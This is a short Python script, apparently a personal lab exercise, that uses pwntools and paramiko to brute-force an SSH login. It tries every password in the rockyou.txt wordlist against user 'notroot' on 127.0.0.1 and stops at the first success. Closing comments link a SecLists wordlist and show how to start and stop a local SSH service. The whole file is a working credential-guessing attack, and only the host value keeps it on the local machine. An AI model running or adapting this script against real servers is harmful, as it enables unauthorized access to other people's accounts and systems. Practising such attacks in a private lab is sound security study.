from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("rockyou.txt", "r", encoding="latin-1") as password_lists:
    for password in password_lists:
        password = password.strip()

        try:
            print(f"[{attempts}] Attempting Password: {password}!")

            response = ssh(host=host, user=username, password=password, timeout=1)

            if response.connected():
                print("\n[SUCCESS] Password found:", password)
                response.close()
                break

            response.close()

        except paramiko.ssh_exception.AuthenticationException:
            print("Invalid password")

        except EOFError:
            # pwntools sometimes throws EOFError on failed connect
            print("Connection failed (EOF)")

        attempts += 1



#https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials

#Pwntools is trying to perform a REAL SSH handshake

#sudo systemctl start ssh
#sudo systemctl enable ssh


#sudo systemctl stop ssh  
#sudo systemctl disable ssh
